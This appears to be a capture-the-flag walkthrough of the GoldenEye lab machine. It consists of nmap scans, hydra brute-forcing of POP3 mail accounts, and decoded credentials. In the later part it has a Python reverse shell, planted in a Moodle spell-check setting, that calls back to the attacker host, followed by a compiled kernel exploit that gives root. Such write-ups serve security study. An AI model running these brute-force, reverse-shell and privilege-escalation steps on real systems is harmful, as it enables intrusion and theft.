@@ -1,0 +1,350 @@
+└─$ nmap -sSCV -p 25,80,55006,55007 192.168.178.131
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 23:14 PDT
+Nmap scan report for 192.168.178.131
+Host is up (0.00048s latency).
+
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_ssl-date: TLS randomness does not represent time
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2018-04-24T03:22:34
+|_Not valid after:  2028-04-21T03:22:34
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: GoldenEye Primary Admin Server
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+55007/tcp open  unknown
+
+└─$ nmap -p 25,55006,55007 -A 192.168.178.131   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 23:40 PDT
+Nmap scan report for 192.168.178.131
+Host is up (0.00072s latency).
+
+PORT      STATE SERVICE  VERSION
+25/tcp    open  smtp     Postfix smtpd
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2018-04-24T03:22:34
+|_Not valid after:  2028-04-21T03:22:34
+|_ssl-date: TLS randomness does not represent time
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+55006/tcp open  ssl/pop3 Dovecot pop3d
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_pop3-capabilities: SASL(PLAIN) TOP USER AUTH-RESP-CODE RESP-CODES UIDL PIPELINING CAPA
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3     Dovecot pop3d
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2018-04-24T03:23:52
+|_Not valid after:  2028-04-23T03:23:52
+|_pop3-capabilities: TOP RESP-CODES SASL(PLAIN) USER AUTH-RESP-CODE STLS UIDL PIPELINING CAPA
+|_ssl-date: TLS randomness does not represent time
+
+
+https://192.168.178.131:55006/
+
++OK GoldenEye POP3 Electronic-Mail System
+
+var data = [
+  {
+    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
+  }
+];
+
+//
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+
+boris
+InvincibleHack3r
+
+//try to brute force pop3 account of boris, using fasttrack(magic wordlist)
+─$ hydra -l boris -P /home/ed/Downloads/fasttrack.txt -f 192.168.178.131 pop3 -V -s 55007 -t 64
+
+[55007][pop3] host: 192.168.178.131   login: boris   password: secret1!
+[STATUS] attack finished for 192.168.178.131 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-09 01:33:34
+
+
+─$ telnet 192.168.178.131 55007
+Trying 192.168.178.131...
+Connected to 192.168.178.131.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS secret1!
++OK Logged in.
+RETR 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id C3F2B454B1
+	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+
+-ERR Unknown command: 
+LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id D9E47454B1
+	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+RETR 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised
+
+//we got a username internal natalya
+
+─$ hydra -l natalya -P /home/ed/Downloads/fasttrack.txt -f 192.168.178.131 pop3 -V -s 55007 -t 64 
+
+[55007][pop3] host: 192.168.178.131   login: natalya   password: bird
+[STATUS] attack finished for 192.168.178.131 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+
+└─$ telnet 192.168.178.131 55007
+Trying 192.168.178.131...
+Connected to 192.168.178.131.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya
++OK
+PASS ird
+PASS bird
+-ERR [AUTH] Authentication failed.
+-ERR No username given.
+USER natalya
++OK
+PASS bird
++OK Logged in.
+LIST
++OK 2 messages:
+1 631
+2 1048
+.
+RETR 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+
+
+http://severnaya-station.com/gnocertdir/login/index.php
+//login as xenia
+
+http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5
+//under this page, we found a name internal: My email username is...doak 
+//try to hydra it in pop3
+
+─$ hydra -l doak -P /home/ed/Downloads/fasttrack.txt -f 192.168.178.131 pop3 -V -s 55007 -t 32
+[55007][pop3] host: 192.168.178.131   login: doak   password: goat
+[STATUS] attack finished for 192.168.178.131 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+└─$ telnet 192.168.178.131 55007
+Trying 192.168.178.131...
+Connected to 192.168.178.131.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER doak
++OK
+PASS goat
++OK Logged in.
+LIST
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+
+//login in back in the web
+//under http://severnaya-station.com/dir007key/for-007.jpg, find a file
+
+http://severnaya-station.com/dir007key/for-007.jpg
+─$ exiftool for-007.jpg         
+ExifTool Version Number         : 13.10
+File Name                       : for-007.jpg
+Directory                       : .
+File Size                       : 15 kB
+File Modification Date/Time     : 2025:05:09 02:08:01-07:00
+File Access Date/Time           : 2025:05:09 02:08:01-07:00
+File Inode Change Date/Time     : 2025:05:09 02:08:05-07:00
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+X Resolution                    : 300
+Y Resolution                    : 300
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Image Description               : eFdpbnRlcjE5OTV4IQ==
+Make                            : GoldenEye
+Resolution Unit                 : inches
+
+└─$ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d                              
+xWinter1995x!   
+//admin passwd
+
+
+http://severnaya-station.com/gnocertdir/admin/settings.php
+//we can change the aspell tool to a revershell, so when specll shell is used, it will be triggered.
+//also change http://severnaya-station.com/gnocertdir/admin/settings.php spell engine to PSpellShell.
+//then in the editor , click spell check button.
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.178.129",8821));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [192.168.178.129] from (UNKNOWN) [192.168.178.131] 37379
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+uname -ar
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+www-data@ubuntu:/var/www/html$ cat /etc/os*
+cat /etc/os*
+NAME="Ubuntu"
+VERSION="14.04.1 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.1 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+
+http://severnaya-station.com/splashAdmin.php
+//from this page, we got gcc is remove on this host.
+
+so for th exploit of kernal, we change the gcc to cc.
+cc 37292.c -o f //we met some warnings, but still get the compliered file.
+
+www-data@ubuntu:/tmp$ ls
+ls
+37292.c  a.out	f  tinyspellJ7dTFB  tinyspelloBt2Zz  vmware-root
+www-data@ubuntu:/tmp$ ./f
+./f
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+# cat .flag.txt
+cat .flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
